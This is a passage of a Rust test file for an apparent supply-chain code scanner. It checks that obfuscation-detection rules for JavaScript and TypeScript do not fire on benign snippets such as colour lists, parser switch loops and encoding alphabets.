        "case.ts",
        "let usedModels: string[]; usedModels = ['rgb', 'hex', 'ansi256'];\n",
    );
    assert_no_match(
        "chainsec.ts.detection.heuristic.string-table",
        "case.ts",
        "const colorNames = [...foregroundColorNames, ...backgroundColorNames];\n",
    );
    assert_no_match(
        "chainsec.js.detection.heuristic.string-table",
        "case.js",
        "const names = []; const seen = []; const bytes = new Uint8Array(5);\n",
    );
    assert_no_match(
        "chainsec.js.detection.heuristic.string-table",
        "case.js",
        "operands = [];\nallowedValues = ['beforeAll', 'before', 'after', 'afterAll'];\nr = [i, ...this.yargs.getAliases()[i] || []];\n",
    );
    assert_no_match(
        "chainsec.ts.detection.heuristic.string-table",
        "case.ts",
        "const names: string[] = []; const seen: string[] = []; const bytes = new Uint8Array(5);\n",
    );
    assert_no_match(
        "chainsec.js.detection.heuristic.control-flow-flattening",
        "case.js",
        "while (node) { switch (parent.type) { case 'program': visit(); break; case 'block': leave(); break; } }\n",
    );
    assert_no_match(
        "chainsec.ts.detection.heuristic.control-flow-flattening",
        "case.ts",
        "while (index < input.length) { switch (ch) { case '{': open(); break; case '}': close(); break; } index++; }\n",
    );
    assert_no_match(
        "chainsec.js.detection.heuristic.control-flow-flattening",
        "case.js",
        "while (state) { switch (state) { case 0: run(); break; case 1: /* order[cursor++] */ stop(); break; } }\n",
    );
    assert_no_match(
        "chainsec.js.detection.heuristic.control-flow-flattening",
        "case.js",
        "while (pos < len) { const token = attr[pos]; switch (token[FIELDS.TYPE]) { case tokens.space: consume(); break; default: fail(); } pos++; }\n",
    );
    assert_no_match(
        "chainsec.ts.detection.heuristic.control-flow-flattening",
        "case.ts",
        "while (pos < len) { const token = attr[pos]; switch (token[FIELDS.TYPE]) { case tokens.space: consume(); break; default: fail(); } pos++; }\n",
    );
    assert_no_match(
        "chainsec.js.detection.heuristic.string-table",
        "case.js",
        "const _0x1234 = [1, 2, 3, 4, 5];\n",
    );
    assert_no_match(
        "chainsec.ts.detection.heuristic.string-table",
        "case.ts",
        "const _0x1234: string[] = [];\n",
    );
    assert_no_match(
        "chainsec.js.detection.encoded-escapes",
        "case.js",
        "const codePage = \"\\u0000\\u0001\\u0002\\u0003\\u0004\\u0005\\u0006\\u0007\";\n",
    );
    assert_no_match(
        "chainsec.js.detection.heuristic.high-entropy-string",
        "case.js",
        "const base58Alphabet = \"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ\";\n",
    );
    assert_no_match(
        "chainsec.ts.detection.decoded-payload",
        "case.ts",
        "const decoded = atob(encoded);\n",
    );
    assert_no_match(
        "chainsec.ts.detection.heuristic.high-entropy-string",
        "case.ts",
        concat!(
            "const base32 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567\";\n",
            "const base32Hex = \"0123456789ABCDEFGHIJKLMNOPQRSTUV\";\n",
            "const crockford = \"0123456789ABCDEFGHJKMNPQRSTVWXYZ\";\n",
            "const ascii85 = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~\";\n",
            "const digest = \"sha-512=:WZDPaVn/7XgHaAy8pmojAkGWoRx2UFChF41A2svX+TaPm+AbwAgBWnrIiYllu7BNNyealdVLvRwEmTHWXvJwew==:\";\n",
            "const binary = \"!<tag:yaml.org,2002:binary> AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8gISIjJCUmJygpKissLS4vMDE=\\n\";\n",
        ),
    );
}

fn assert_no_match(rule_id: &str, file_name: &str, source: &str) {
    let rules = rules::default_rules();
    let rule = rules
        .iter()
        .find(|rule| rule.id == rule_id)
        .unwrap_or_else(|| panic!("unknown rule {rule_id}"));
    let directory = tempfile::tempdir().unwrap();
    fs::write(directory.path().join(file_name), source).unwrap();

    let outcome = scanner::scan(
        directory.path(),
        "fixture",
        std::slice::from_ref(rule),
        &EngineLimits::default(),
    )
    .unwrap_or_else(|error| panic!("scan failed for {rule_id}: {error}"));

    assert!(
        outcome.findings.is_empty(),
        "rule {rule_id} unexpectedly matched:\n{source}"
    );
}

#[test]
fn every_rule_compiles() {
    scanner::validate_rules(&rules::default_rules()).unwrap();
}
